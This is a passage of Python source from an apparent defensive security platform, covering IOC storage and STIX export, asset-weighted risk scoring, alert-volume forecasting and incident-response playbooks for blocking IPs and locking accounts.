                "by_severity": dict(collections.Counter(f["severity"] for f in fs)), "feed_entries": len(self.feed()),
                "most_exposed_hosts": hosts.most_common(8), "mode": "feed match + config audit + prioritisation", "findings": fs[:300]}

    def scan(self, host: str, ports=None) -> dict:
        r = scan_ports(host, ports)
        fs = []
        for p in r["open"]:
            d, w = RISKY_PORTS.get(p, (None, 0))
            if d:
                fs.append(make_finding(self.key, f"{host}:{p}", w * 70, [f"Open port {p}: {d}"], {"host": host, "port": p}, ["T1046"], entity=host))
        r["findings"] = fs
        return r


# ═══════════════════════════════════════════════════════════════════════
#  THREAT INTELLIGENCE
# ═══════════════════════════════════════════════════════════════════════
ACTIONS_BY_MODULE = {
    "malware": "Isolate affected hosts, collect the sample + hashes, re-image if executed, hunt the hash across endpoints.",
    "phishing": "Block sender/URLs at the mail & web gateway, purge delivered copies, reset credentials of anyone who clicked.",
    "password": "Enforce lockout + MFA, block the source IPs, force password resets for targeted accounts, check for reuse in breach corpora.",
    "iam": "Revoke sessions/tokens, require MFA re-enrolment, review privileged group changes, disable dormant accounts.",
    "intrusion": "Patch or virtual-patch the targeted application, add WAF rules, block attacker IPs, review web logs for successful requests.",
    "network": "Investigate beaconing hosts, block C2 destinations, restrict egress, segment SMB/RDP between workstations.",
    "uba": "Validate the activity with the user/manager; if unexplained treat the account as compromised.",
    "fraud": "Hold the transactions, contact the account owner out-of-band, tighten velocity / new-device rules.",
    "dlp": "Stop the transfer, rotate any exposed secrets immediately, review who received the data.",
    "vuln": "Patch internet-facing criticals first, then known-exploited issues; close unnecessary exposed services.",
    "logs": "Pivot from the flagged lines to the source host, preserve logs, check for follow-on activity.",
    "alerts": "Follow the suggested playbook for the alert category and close false positives to improve the model.",
}


class ThreatIntel:
    def __init__(self, hub):
        self.hub, self.lock = hub, threading.RLock()
        self.path = os.path.join(hub.home, "intel.json")
        self.iocs: dict = {}
        try:
            with open(self.path, encoding="utf-8") as f:
                self.iocs = json.load(f)
        except Exception:
            pass
        self._dirty = 0

    def save(self):
        with self.lock:
            try:
                tmp = self.path + ".tmp"
                with open(tmp, "w", encoding="utf-8") as f:
                    json.dump(self.iocs, f)
                os.replace(tmp, self.path)
            except OSError:
                pass
            self._dirty = 0

    def add(self, typ: str, value: str, source: str, conf: int = 30, tags: list | None = None, ts: float | None = None):
        value = value.strip()
        if not value:
            return
        k = f"{typ}:{value.lower()}"
        ts = ts or now()
        with self.lock:
            e = self.iocs.get(k)
            if e is None:
                e = self.iocs[k] = {"type": typ, "value": value, "first": ts, "last": ts, "sources": [], "confidence": 0, "tags": [], "count": 0}
            e["last"], e["count"] = max(e["last"], ts), e["count"] + 1
            if source not in e["sources"] and len(e["sources"]) < 10:
                e["sources"].append(source)
            e["confidence"] = int(min(99, max(e["confidence"], conf) + (5 if len(e["sources"]) > 1 else 0)))
            for t in tags or []:
                if t not in e["tags"] and len(e["tags"]) < 12:
                    e["tags"].append(t)
            if typ in ("sha256", "sha1", "md5") and e["confidence"] >= 70:
                self.hub.ioc_hashes.add(value.lower())
            self._dirty += 1
            if self.hub.pg is not None:
                self.hub.pg.put_ioc(e)
            if len(self.iocs) > 100000:
                for old in sorted(self.iocs, key=lambda x: self.iocs[x]["last"])[:5000]:
                    self.iocs.pop(old, None)
        if self._dirty >= 50:
            self.save()

    def add_from_iocs(self, iocs: dict, source: str, base_conf=30, tags=None):
        for typ, vals in iocs.items():
            for v in vals[:200]:
                self.add(typ, v, source, base_conf, tags)

    def add_from_finding(self, f: dict):
        if f["score"] < 60 or f["module"] in ("risk", "predict"):
            return
        conf = int(min(95, f["score"] * 0.9))
        tags = [f["module"], f["severity"]] + f.get("mitre", [])[:3]
        ev = f.get("evidence", {})
        if f.get("entity") and is_ip(f["entity"]) and not is_private_ip(f["entity"]):
            self.add("ipv4", f["entity"], f"finding:{f['module']}", conf, tags, f["ts"])
        for key in ("src_ip",):
            v = ev.get(key)
            if v and is_ip(v) and not is_private_ip(v):
                self.add("ipv4", v, f"finding:{f['module']}", conf, tags, f["ts"])
        for u in ev.get("urls", []) or []:
            self.add("url", u, f"finding:{f['module']}", conf, tags, f["ts"])
        if ev.get("sha256") and f["module"] == "malware":
            self.add("sha256", ev["sha256"], "finding:malware", conf, tags, f["ts"])
        if f["module"] == "network" and ev.get("dst") and not is_private_ip(str(ev["dst"])):
            self.add("ipv4", ev["dst"], "finding:network", conf, tags, f["ts"])

    def query(self, min_conf=0, typ=None, limit=500) -> list:
        with self.lock:
            xs = [e for e in self.iocs.values() if e["confidence"] >= min_conf and (not typ or e["type"] == typ)]
        return sorted(xs, key=lambda e: (-e["confidence"], -e["last"]))[:limit]

    def is_known_bad(self, value: str, min_conf=50) -> dict | None:
        for typ in ("ipv4", "domain", "url", "sha256", "md5", "sha1", "email"):
            e = self.iocs.get(f"{typ}:{value.strip().lower()}")
            if e and e["confidence"] >= min_conf:
                return e
        return None

    def export_stix(self, min_conf=40, valid_days=90) -> dict:
        import uuid
        ns = uuid.UUID("5b7d3a1e-6c0a-4f1e-9a0f-2b6f5c6d7e01")
        t0 = datetime.datetime.now(UTC)
        iso = lambda d: d.strftime("%Y-%m-%dT%H:%M:%S.000Z")
        ident = {"type": "identity", "spec_version": "2.1", "id": f"identity--{uuid.uuid5(ns, 'cryptosec')}", "created": iso(t0),
                 "modified": iso(t0), "name": f"CryptoSec {AI_VERSION}", "identity_class": "system"}
        objs = [ident]

        def esc(s):
            return s.replace("\\", "\\\\").replace("'", "\\'")
        patmap = {"ipv4": "ipv4-addr:value", "domain": "domain-name:value", "url": "url:value", "email": "email-addr:value",
                  "sha256": "file:hashes.'SHA-256'", "sha1": "file:hashes.'SHA-1'", "md5": "file:hashes.MD5"}
        for e in self.query(min_conf, limit=5000):
            if e["type"] not in patmap:
                continue
            fi = datetime.datetime.fromtimestamp(e["first"], UTC)
            objs.append({"type": "indicator", "spec_version": "2.1", "id": f"indicator--{uuid.uuid5(ns, e['type'] + e['value'].lower())}",
                         "created_by_ref": ident["id"], "created": iso(fi), "modified": iso(datetime.datetime.fromtimestamp(e["last"], UTC)),
                         "name": f"{e['type']} {e['value']}"[:120], "pattern": f"[{patmap[e['type']]} = '{esc(e['value'])}']", "pattern_type": "stix",
                         "valid_from": iso(fi), "valid_until": iso(t0 + datetime.timedelta(days=valid_days)), "confidence": e["confidence"],
                         "labels": e["tags"][:8], "indicator_types": ["malicious-activity"]})
        return {"type": "bundle", "id": f"bundle--{uuid.uuid4()}", "objects": objs}

    def export_csv(self, min_conf=0) -> str:
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["type", "value", "confidence", "first_seen", "last_seen", "count", "sources", "tags"])
        for e in self.query(min_conf, limit=100000):
            w.writerow([e["type"], e["value"], e["confidence"], fmt_ts(e["first"]), fmt_ts(e["last"]), e["count"], ";".join(e["sources"]), ";".join(e["tags"])])
        return buf.getvalue()

    def blocklist(self, min_conf=70) -> list:
        return [e["value"] for e in self.query(min_conf, "ipv4")]

    def report(self, hours: int = 24, with_llm: bool = False) -> str:
        since = now() - hours * 3600
        fs = [a for a in self.hub.alerts.all() if a["ts"] >= since]
        sev = collections.Counter(a["severity"] for a in fs)
        mod = collections.Counter(a["module"] for a in fs)
        ent = collections.Counter(a["entity"] for a in fs if a.get("entity"))
        mt = collections.Counter(t for a in fs for t in a.get("mitre", []))
        iocs = self.query(60, limit=10)
        lines = [f"THREAT INTELLIGENCE SUMMARY — last {hours} h  ({fmt_ts(now())})", "=" * 64,
                 f"Alerts: {len(fs)}  (critical {sev['critical']}, high {sev['high']}, medium {sev['medium']}, low {sev['low']})", ""]
        if not fs:
            lines.append("No alerts in this window. Run detections or start the real-time monitor to populate intelligence.")
        else:
            lines.append("Where the activity is coming from:")
            lines += [f"  • {m}: {c}" for m, c in mod.most_common(6)]
            if ent:
                lines += ["", "Most-implicated entities:"] + [f"  • {e}: {c} alert(s)" for e, c in ent.most_common(5)]
            if mt:
                lines += ["", "ATT&CK techniques observed:  " + ", ".join(f"{t} (×{c})" for t, c in mt.most_common(8))]
            top = sorted(fs, key=lambda a: -a["score"])[:5]
            lines += ["", "Highest-scoring findings:"] + [f"  [{a['severity'].upper():8}] {a['module']}: {a['subject'][:70]} — {a['reasons'][0][:80]}" for a in top]
            lines += ["", "Recommended actions:"] + [f"  → {ACTIONS_BY_MODULE[m]}" for m, _ in mod.most_common(4) if m in ACTIONS_BY_MODULE]
        if iocs:
            lines += ["", "Strongest indicators (defanged):"] + [f"  • {e['type']:7} {defang(e['value'])[:80]}  (confidence {e['confidence']})" for e in iocs]
        text = "\n".join(lines)
        if with_llm:
            text += "\n\n" + self.hub.llm.narrate(text)
        return text


class ThreatIntelDetector(Detector):
    train_label = "📥 Import IOC feed"
    key, title = "intel", "Threat Intelligence Generation"
    blurb = ("Extracts IOCs (IPs, domains, URLs, hashes, e-mails, CVEs, wallets) from any text/log/report, scores them against what "
             "this system has already seen, and generates STIX 2.1 bundles, CSV and blocklists plus an executive summary.")
    mitre = []
    mode = "text"
    trainable = True
    use_extra = False
    input_help = "Paste a report, e-mail, log extract or any text containing indicators."
    columns_help = "IOC feed: columns type,value (or indicator),confidence,tags. Imported into the intelligence store."

    def load_model(self):
        self.model = None

    def train(self, table, label=None, contamination=0.02):
        n = 0
        for r in table.rows[:200000]:
            v = str(r.get("value") or r.get("indicator") or r.get("ioc") or r.get("ip") or r.get("domain") or r.get("url") or r.get("hash") or "").strip()
            if not v:
                continue
            found = extract_iocs(v)
            typ = str(r.get("type") or "").lower() or (next(iter(found)) if found else "")
            if typ in ("ip", "ip-dst", "ip-src"):
                typ = "ipv4"
            if typ in ("sha-256",):
                typ = "sha256"
            if typ:
                self.hub.ti.add(typ, v, f"feed:{table.name}", int(fnum(r.get("confidence"), 60)), str(r.get("tags") or "").split(";")[:5])
                n += 1
        self.hub.ti.save()
        self.trained_on = {"dataset": table.name, "sha256": table.sha, "rows": n, "ts": now(), "kind": "ioc-feed"}
        self.hub.on_trained(self, self.trained_on, {"indicators_loaded": n})
        return {"module": self.key, "kind": "ioc-feed", "metrics": {"indicators_loaded": n}}

    def analyze(self, item, **kw):
        text = item if isinstance(item, str) else dumps(item)
        iocs = extract_iocs(text)
        if not iocs:
            return make_finding(self.key, "text", 0, ["No indicators of compromise found"], {}, [])
        known, rows = 0, []
        for typ, vals in iocs.items():
            for v in vals:
                e = self.hub.ti.is_known_bad(v, 50)
                if typ == "sha256" and v.lower() in self.hub.ioc_hashes:
                    e = e or {"confidence": 98, "sources": ["malware IOC list"]}
                if e:
                    known += 1
                rows.append({"type": typ, "value": defang(v), "known_bad": bool(e), "confidence": (e or {}).get("confidence")})
        self.hub.ti.add_from_iocs(iocs, "manual", 30)
        total = sum(len(v) for v in iocs.values())
        score = min(95, 15 + 6 * total + 40 * (known > 0) + 5 * known)
        return make_finding(self.key, f"{total} indicator(s)", score, ["Extracted: " + ", ".join(f"{len(v)} {k}" for k, v in iocs.items()),
                                                                       f"{known} already known as malicious in this system"],
                            {"indicators": rows[:100]}, [], verdict="intel extracted")

    def analyze_table(self, table, limit=100000, threshold=0):
        text = "\n".join(" ".join(str(v) for v in r.values()) for r in table.rows[:limit])
        f = self.analyze(text)
        return {"module": self.key, "dataset": table.name, "rows": len(table), "flagged": int(f["score"] >= 50), "findings": [f],
                "mode": "IOC extraction", "iocs_in_store": len(self.hub.ti.iocs)}


# ═══════════════════════════════════════════════════════════════════════
#  RISK ASSESSMENT & PRIORITISATION
# ═══════════════════════════════════════════════════════════════════════
MOD_WEIGHT = {"malware": 1.0, "intrusion": 0.95, "password": 0.9, "iam": 0.95, "fraud": 0.95, "dlp": 0.9, "vuln": 0.85, "network": 0.85,
              "uba": 0.7, "logs": 0.7, "phishing": 0.8, "anomaly": 0.55, "spam": 0.25, "alerts": 0.6, "intel": 0.5}


class RiskDetector(Detector):
    train_label = "📥 Import asset list"
    key, title = "risk", "Risk Assessment & Prioritization"
    blurb = ("Fuses every finding into a ranked risk register: likelihood (score × recency × module reliability) × impact (asset criticality). "
             "Upload an asset list to weight business value; also supports a classic 5×5 likelihood/impact matrix.")
    mitre = []
    mode = "special"
    trainable = True
    use_extra = False
    input_help = "JSON {likelihood:1-5, impact:1-5}  — or leave empty to compute the live register from all findings."
    columns_help = "Assets: asset/host/user/ip, criticality (1-5), owner, exposure."

    def __init__(self, hub):
        self.assets: dict = {}
        super().__init__(hub)
        try:
            with open(os.path.join(hub.home, "assets.json"), encoding="utf-8") as f:
                self.assets = json.load(f)
        except Exception:
            pass

    def load_model(self):
        self.model = None

    def train(self, table, label=None, contamination=0.02):
        a = {}
        for r in table.rows[:100000]:
            k = str(r.get("asset") or r.get("host") or r.get("hostname") or r.get("user") or r.get("ip") or r.get("name") or "").strip()
            if k:
                a[k] = {"criticality": clamp(fnum(r.get("criticality") or r.get("value") or r.get("impact"), 3), 1, 5),
                        "owner": str(r.get("owner") or ""), "exposure": str(r.get("exposure") or "")}
        if not a:
            raise ValueError("No assets found – need a column named asset/host/hostname/user/ip with a criticality (1-5).")
        self.assets = a
        with open(os.path.join(self.hub.home, "assets.json"), "w", encoding="utf-8") as f:
            json.dump(a, f)
        self.trained_on = {"dataset": table.name, "sha256": table.sha, "rows": len(a), "ts": now(), "kind": "assets"}
        self.hub.on_trained(self, self.trained_on, {"assets_loaded": len(a)})
        return {"module": self.key, "kind": "assets", "metrics": {"assets_loaded": len(a)}}

    def register(self, findings=None, half_life_days=7.0) -> dict:
        fs = findings if findings is not None else self.hub.alerts.all()
        t = now()
        groups: dict = collections.defaultdict(list)
        for f in fs:
            if f["module"] in ("risk", "predict", "intel"):
                continue
            ent = f.get("entity") or f.get("evidence", {}).get("host") or f.get("evidence", {}).get("user") or f.get("subject", "?")
            groups[str(ent)[:80]].append(f)
        items = []
        for ent, lst in groups.items():
            ws = []
            for f in lst:
                rec = 0.5 ** (max(0.0, t - f["ts"]) / 86400 / half_life_days)
                ws.append(f["score"] / 100 * rec * MOD_WEIGHT.get(f["module"], .6))
            like = noisy_or(ws)
            crit = self.assets.get(ent, {}).get("criticality") or max([f.get("evidence", {}).get("criticality", 0) or 0 for f in lst] + [3])
            impact = 0.4 + 0.6 * (crit - 1) / 4
            risk = like * impact * 100
            top = max(lst, key=lambda f: f["score"])
            band = "critical" if risk >= 60 else "high" if risk >= 40 else "medium" if risk >= 20 else "low"
            items.append({"entity": ent, "risk": round(risk, 1), "band": band, "likelihood": round(like, 3), "impact": round(impact, 2),
                          "criticality": crit, "findings": len(lst), "top_module": top["module"], "top_reason": top["reasons"][0][:110],
                          "modules": sorted({f["module"] for f in lst}),
                          "treatment": {"critical": "Mitigate now (≤24 h): contain, then fix root cause", "high": "Mitigate this week; assign an owner",
                                        "medium": "Schedule remediation; monitor", "low": "Accept / monitor"}[band],
                          "action": ACTIONS_BY_MODULE.get(top["module"], "Investigate.")})
        items.sort(key=lambda x: -x["risk"])
        org = noisy_or([i["risk"] / 100 * 0.55 for i in items[:10]]) * 100
        reg = {"generated": t, "org_risk": round(org, 1), "posture": round(100 - org, 1), "items": items[:200],
               "counts": dict(collections.Counter(i["band"] for i in items))}
        self._history(reg)
        return reg

    def _history(self, reg):
        p = os.path.join(self.hub.home, "risk_history.json")
        try:
            with open(p, encoding="utf-8") as f:
                h = json.load(f)
        except Exception:
            h = []
        day = fmt_ts(reg["generated"])[:10]
        if not h or h[-1]["day"] != day:
            h.append({"day": day, "org_risk": reg["org_risk"]})
        else:
            h[-1]["org_risk"] = reg["org_risk"]
        try:
            with open(p, "w", encoding="utf-8") as f:
                json.dump(h[-365:], f)
        except OSError:
            pass

    def analyze(self, item, **kw):
        if isinstance(item, dict) and ("likelihood" in item or "impact" in item):
            L, I = clamp(fnum(item.get("likelihood"), 3), 1, 5), clamp(fnum(item.get("impact"), 3), 1, 5)
            sc = L * I / 25 * 100
            return make_finding(self.key, str(item.get("asset", "scenario")), sc, [f"Likelihood {L:g} × impact {I:g} on a 5×5 matrix"], {"matrix": [L, I]}, [])
        reg = self.register()
        top = reg["items"][0] if reg["items"] else None
        return make_finding(self.key, "organisation", reg["org_risk"], [f"Posture {reg['posture']}/100 — {len(reg['items'])} risk item(s)"] +
                            ([f"Top: {top['entity']} ({top['band']}, {top['risk']})"] if top else []), {"register": reg["items"][:10]}, [])

    def analyze_table(self, table, limit=100000, threshold=0):
        if any(c in table.columns for c in ("criticality", "asset", "host", "hostname")) and "score" not in table.columns:
            self.train(table)
        reg = self.register()
        fs = [make_finding(self.key, i["entity"], i["risk"], [i["top_reason"], i["treatment"]], {"modules": i["modules"], "criticality": i["criticality"]}, [],
                           verdict=i["band"], entity=i["entity"]) for i in reg["items"][:100]]
        return {"module": self.key, "dataset": table.name, "rows": len(table), "flagged": len([i for i in reg["items"] if i["band"] in ("critical", "high")]),
                "org_risk": reg["org_risk"], "posture": reg["posture"], "counts": reg["counts"], "mode": "risk register", "findings": fs}


# ═══════════════════════════════════════════════════════════════════════
#  PREDICTIVE THREAT ANALYSIS
# ═══════════════════════════════════════════════════════════════════════
def _hw(y, m, a, b, g, phi=0.95):
    n = len(y)
    if m > 1:
        lvl = float(np.mean(y[:m]))
        tr = float((np.mean(y[m:2 * m]) - np.mean(y[:m])) / m) if n >= 2 * m else 0.0
        seas = list(y[:m] - lvl)
    else:
        lvl, tr, seas = float(y[0]), float(y[1] - y[0]) if n > 1 else 0.0, [0.0]
    fit = np.zeros(n)
    for t in range(n):
        s = seas[t % m] if m > 1 else 0.0
        fit[t] = lvl + phi * tr + s
        nl = a * (y[t] - s) + (1 - a) * (lvl + phi * tr)
        tr = b * (nl - lvl) + (1 - b) * phi * tr
        if m > 1:
            seas[t % m] = g * (y[t] - nl) + (1 - g) * s
        lvl = nl
    return lvl, tr, seas, fit


def forecast_series(y, h=24, period=None) -> dict:
    y = np.asarray(y, float)
    n = len(y)
    if n < 8:
        raise ValueError("Need at least 8 time buckets to forecast.")
    m = 1
    if period:
        m = int(period)
    else:
        yc = y - y.mean()
        den = float((yc ** 2).sum()) or 1.0
        best = 0.3
        for cand in (24, 7, 12, 168, 60):
            if n >= 2 * cand + 2:
                ac = float((yc[:-cand] * yc[cand:]).sum() / den)
                if ac > best:
                    best, m = ac, cand
    if n < 2 * m + 2:
        m = 1
    best_sse, best_p = float("inf"), None
    for a in (.1, .3, .5, .8):
        for b in (.01, .05, .15):
            for g in ((.1, .3, .6) if m > 1 else (0,)):
                _, _, _, fit = _hw(y, m, a, b, g)
                sse = float(((y[m:] - fit[m:]) ** 2).sum())
                if sse < best_sse:
                    best_sse, best_p = sse, (a, b, g)
    lvl, tr, seas, fit = _hw(y, m, *best_p)
    phi = 0.95
    res = y[m:] - fit[m:]
    sigma = float(res.std()) or float(y.std()) or 1.0
    fc, lo, hi = [], [], []
    for k in range(1, h + 1):
        damp = sum(phi ** i for i in range(1, k + 1))
        v = lvl + damp * tr + (seas[(n + k - 1) % m] if m > 1 else 0.0)
        s = sigma * math.sqrt(1 + 0.15 * k)
        fc.append(max(0.0, v))
        lo.append(max(0.0, v - 1.96 * s))
        hi.append(v + 1.96 * s)
    naive = float(np.abs(y[1:] - y[:-1]).mean()) if n > 1 else 1.0
    mae = float(np.abs(res).mean()) if len(res) else 0.0
    slope = float(np.polyfit(np.arange(n), y, 1)[0]) if n > 2 else 0.0
    return {"forecast": fc, "lo": lo, "hi": hi, "sigma": sigma, "period": m, "params": best_p, "mae": mae, "naive_mae": naive,
            "skill": round(1 - mae / naive, 3) if naive else 0, "slope_per_bucket": slope, "mean": float(y.mean()), "std": float(y.std())}


def p_exceed(value, sigma, thr) -> float:
    return 0.5 * math.erfc((thr - value) / max(sigma, 1e-9) / math.sqrt(2))


class PredictDetector(Detector):
    key, title = "predict", "Predictive Cyber Threat Analysis"
    blurb = ("Holt-Winters forecasting of attack/alert volume with seasonality detection, prediction intervals, and the probability that "
             "upcoming periods breach a threshold. Feed it a time series, or let it learn from this system's own alert history.")
    mitre = []
    mode = "series"
    trainable = False
    use_extra = False
    input_help = "A JSON list of counts per time bucket, e.g. [4,6,3,9,…] (≥ 8 values) — or empty to use the live alert history."
    columns_help = "Time series: a timestamp column and (optionally) a numeric count column; otherwise rows are counted per bucket."

    def load_model(self):
        self.model = None

    def _bucket(self, tss) -> int:
        span = max(tss) - min(tss)
        return 60 if span < 4 * 3600 else 3600 if span < 20 * 86400 else 86400

    def series_from_ts(self, tss, vals=None, bucket=None):
        bucket = bucket or self._bucket(tss)
        t0 = int(min(tss) // bucket)
        n = int(max(tss) // bucket) - t0 + 1
        y = np.zeros(min(n, 20000))
        for i, t in enumerate(tss):
            k = int(t // bucket) - t0
            if 0 <= k < len(y):
                y[k] += vals[i] if vals is not None else 1
        return y, bucket, t0 * bucket

    def forecast_report(self, y, bucket, t0, h=None, thr=None, label="events") -> dict:
        h = h or {60: 60, 3600: 24, 86400: 14}.get(bucket, 24)
        r = forecast_series(y, h)
        thr = thr if thr is not None else r["mean"] + 3 * r["std"]
        pe = [p_exceed(v, r["sigma"] * math.sqrt(1 + 0.15 * (i + 1)), thr) for i, v in enumerate(r["forecast"])]
        r.update(bucket_s=bucket, threshold=thr, p_exceed=pe, p_exceed_any=float(1 - np.prod([1 - p for p in pe])),
                 next_ts=[t0 + (len(y) + i) * bucket for i in range(h)], history=y[-200:].tolist(), label=label)
        rel = r["slope_per_bucket"] / max(r["mean"], 1e-9)
        r["trend"] = "rising" if rel > 0.02 and r["slope_per_bucket"] > 0 else "falling" if rel < -0.02 else "stable"
        return r

    def _finding(self, r) -> dict:
        peak = max(r["forecast"])
        score = clamp(0.15 + 0.7 * r["p_exceed_any"] + (0.1 if r["trend"] == "rising" else 0)) * 100
        why = [f"Expected peak ≈ {peak:.0f} per {'minute' if r['bucket_s'] == 60 else 'hour' if r['bucket_s'] == 3600 else 'day'} vs. "
               f"normal {r['mean']:.1f} (±{r['std']:.1f})", f"Chance of breaching the alert threshold ({r['threshold']:.0f}) in the horizon: {r['p_exceed_any'] * 100:.0f}%",
               f"Trend {r['trend']}; seasonality period {r['period']}; forecast skill vs. naive {r['skill']:+.2f}"]
        return make_finding(self.key, f"{r['label']} forecast", score, why, {"summary": {k: r[k] for k in ("mean", "std", "period", "trend", "threshold", "skill")},
                                                                              "forecast": [round(x, 2) for x in r["forecast"]]}, [],
                            verdict="surge expected" if score >= 60 else "stable")

    def analyze(self, item, **kw):
        if isinstance(item, (list, tuple)) or (isinstance(item, str) and item.strip().startswith("[")):
            y = np.array(json.loads(item) if isinstance(item, str) else item, float)
            return self._finding(self.forecast_report(y, 3600, 0, label="series"))
        if isinstance(item, dict) and isinstance(item.get("series"), list):
            return self._finding(self.forecast_report(np.array(item["series"], float), 3600, 0, thr=item.get("threshold"), label="series"))
        return self.from_alerts()

    def from_alerts(self, days=14) -> dict:
        pg = getattr(self.hub, "pg", None)
        if pg is not None and pg.connected:                # SQL generate_series gives a gap-free hourly series
            try:
                ser = pg.alert_series(24 * days)
                if len(ser) >= 24 and sum(n for _, n in ser) >= 10:
                    y = np.array([n for _, n in ser], float)
                    return self._finding(self.forecast_report(y, 3600, ser[0][0], label="alert volume (PostgreSQL)"))
            except Exception:
                pass
        al = [a["ts"] for a in self.hub.alerts.all() if a["ts"] >= now() - days * 86400]
        if len(al) < 10 or max(al) - min(al) < 8 * 3600:
            return make_finding(self.key, "alert volume", 0, [f"Only {len(al)} alerts over {(max(al) - min(al)) / 3600 if al else 0:.0f} h — need ≥ 10 alerts spanning ≥ 8 hours. "
                                                              "Run detections or the real-time monitor first."], {}, [])
        y, b, t0 = self.series_from_ts(al, bucket=3600)
        return self._finding(self.forecast_report(y, b, t0, label="alert volume"))

    def analyze_table(self, table, limit=300000, threshold=0):
        rows = table.rows[:limit]
        tc = next((c for c in table.columns if TIME_RE.search(c)), None) or next((c for c in table.columns if parse_ts(rows[0].get(c)) is not None), None)
        if not tc:
            raise ValueError("No timestamp column found.")
        ts, vals = [], []
        vc = next((c for c in table.columns if c != tc and c in ("count", "value", "events", "alerts", "attacks", "total", "n") and fnum(rows[0].get(c)) is not None), None)
        for r in rows:
            t = parse_ts(r.get(tc))
            if t is not None:
                ts.append(t)
                vals.append(fnum(r.get(vc), 0.0) if vc else 1.0)
        if len(ts) < 8:
            raise ValueError("Too few valid timestamps.")
        y, b, t0 = self.series_from_ts(ts, vals if vc else None)
        r = self.forecast_report(y, b, t0, label=vc or "events")
        f = self._finding(r)
        return {"module": self.key, "dataset": table.name, "rows": len(rows), "flagged": int(f["score"] >= 50), "buckets": len(y),
                "bucket": {60: "minute", 3600: "hour", 86400: "day"}[b], "forecast": r, "mode": "Holt-Winters", "findings": [f]}


# ═══════════════════════════════════════════════════════════════════════
#  AUTOMATED INCIDENT RESPONSE  (playbooks, cases, evidence sealing)
# ═══════════════════════════════════════════════════════════════════════
PLAYBOOKS = {
    "contain_malware": ("Contain malware", [("open_case", {}), ("quarantine_file", {}), ("block_ip", {}), ("seal_evidence", {}), ("notify", {}),
                                            ("advice", {"text": "Isolate the host from the network, collect memory/disk artefacts, hunt the SHA-256 across endpoints, re-image if executed."})]),
    "phishing_response": ("Phishing response", [("open_case", {}), ("block_ip", {}), ("seal_evidence", {}), ("notify", {}),
                                                ("advice", {"text": "Block sender/URLs at the gateway, purge delivered copies, reset credentials of users who clicked, report to the impersonated brand."})]),
    "credential_attack": ("Credential attack", [("open_case", {}), ("block_ip", {}), ("lock_account", {}), ("seal_evidence", {}), ("notify", {}),
                                                ("advice", {"text": "Enforce MFA + lockout, reset targeted accounts, search for the same IPs in VPN/mail logs."})]),
    "account_compromise": ("Account compromise", [("open_case", {}), ("lock_account", {}), ("seal_evidence", {}), ("notify", {}),
                                                   ("advice", {"text": "Revoke sessions and tokens, reset password + MFA, review mailbox rules and OAuth grants, check privileged changes."})]),
    "web_attack": ("Web attack", [("open_case", {}), ("block_ip", {}), ("seal_evidence", {}), ("notify", {}),
                                  ("advice", {"text": "Review whether any request succeeded (HTTP 200/500), virtual-patch with a WAF rule, patch the application."})]),
    "recon_block": ("Reconnaissance", [("open_case", {}), ("block_ip", {}), ("seal_evidence", {})]),
    "c2_containment": ("C2 / beaconing", [("open_case", {}), ("block_ip", {}), ("seal_evidence", {}), ("notify", {}),
                                          ("advice", {"text": "Isolate the beaconing host, capture its traffic, identify the process making the connections."})]),
    "dos_mitigation": ("DoS mitigation", [("open_case", {}), ("block_ip", {}), ("notify", {}),
                                          ("advice", {"text": "Enable rate limiting / upstream scrubbing; coordinate with your ISP/CDN."})]),
    "data_leak": ("Data leak", [("open_case", {}), ("lock_reveal", {}), ("seal_evidence", {}), ("notify", {}),
                                ("advice", {"text": "Stop the transfer, rotate exposed secrets/keys immediately, identify recipients, assess notification duties."})]),
    "fraud_hold": ("Fraud hold", [("open_case", {}), ("lock_account", {}), ("seal_evidence", {}), ("notify", {}),
                                  ("advice", {"text": "Hold or reverse the transactions, contact the customer out-of-band, review linked accounts/devices."})]),
    "patch_ticket": ("Patch ticket", [("open_case", {}), ("seal_evidence", {}), ("advice", {"text": "Patch internet-facing criticals first; apply vendor mitigations where patching must wait."})]),
    "policy_ticket": ("Policy ticket", [("open_case", {}), ("notify", {})]),
    "close_false_positive": ("False positive", [("open_case", {}), ("advice", {"text": "Close the alert and tune the rule/model so it does not repeat."})]),
    "manual_triage": ("Manual triage", [("open_case", {}), ("seal_evidence", {}), ("advice", {"text": "An analyst should review this alert."})]),
}
PLAYBOOK_FOR_MODULE = {"malware": "contain_malware", "phishing": "phishing_response", "password": "credential_attack", "iam": "account_compromise",
                       "uba": "account_compromise", "intrusion": "web_attack", "logs": "web_attack", "network": "recon_block", "fraud": "fraud_hold",
                       "dlp": "data_leak", "vuln": "patch_ticket", "spam": "policy_ticket", "anomaly": "manual_triage"}


class IncidentResponse:
    def __init__(self, hub):
        self.hub, self.lock = hub, threading.RLock()
        self.path = os.path.join(hub.home, "cases.json")
        self.cases: dict = {}
        try:
            with open(self.path, encoding="utf-8") as f:
                self.cases = json.load(f)
        except Exception:
            pass

    def _save(self, case=None):
        if case is not None and self.hub.pg is not None:
            self.hub.pg.put_case(case)
        try:
            tmp = self.path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.cases, f)
            os.replace(tmp, self.path)
        except OSError:
            pass

    def playbook_for(self, f: dict) -> str:
        if f["module"] == "alerts":
            return f.get("evidence", {}).get("playbook", "manual_triage")
        if f["module"] == "network" and "beacon" in f.get("verdict", ""):
            return "c2_containment"
        if f["module"] == "intrusion" and "flood" in " ".join(f.get("reasons", [])).lower():
            return "dos_mitigation"
        return PLAYBOOK_FOR_MODULE.get(f["module"], "manual_triage")

    def plan(self, f: dict) -> dict:
        pb = self.playbook_for(f)
        title, steps = PLAYBOOKS[pb]
        ev = f.get("evidence", {})
        ip = ev.get("src_ip") or (f.get("entity") if is_ip(f.get("entity", "")) else None)
        user = ev.get("user") or (f.get("entity") if f["module"] in ("iam", "uba", "fraud") else None)
        out = []
        for act, args in steps:
            s = {"action": act, "status": "planned", "target": None, "detail": "", "commands": {}}
            if act == "block_ip" and (ev.get("src_ip") == "local" or f.get("entity") == "local"):
                s.update(action="lock_reveal", target="reveal", detail="Attacker is local (wrong passphrases typed in this app): lock the Reveal function for 15 minutes")
            elif act == "block_ip":
                if ip and is_ip(ip) and not ipaddress.ip_address(ip).is_loopback:
                    s.update(target=ip, detail=f"Add {ip} to the in-app blocklist (1 h) and print firewall commands", commands=IPS.commands(ip))
                else:
                    s.update(status="skipped", detail="No attacker IP in this finding")
            elif act == "lock_account":
                if user:
                    s.update(target=user, detail=f"Mark “{user}” as locked in CryptoSec and print the directory commands",
